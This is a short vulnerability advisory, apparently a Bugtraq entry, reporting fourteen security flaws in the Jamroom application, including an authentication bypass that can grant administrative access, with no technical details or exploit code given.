Jamroom is prone to fourteen security vulnerabilities, including an authentication-bypass vulnerability that occurs because the application fails to verify user-supplied data.

Very few technical details are available regarding the remaining security vulnerabilities. We will update this BID when more information is disclosed.

An attacker can exploit the authentication-bypass vulnerability to gain administrative access to the affected application; other attacks are also possible. Effects of the remaining security vulnerabilities are not currently known.
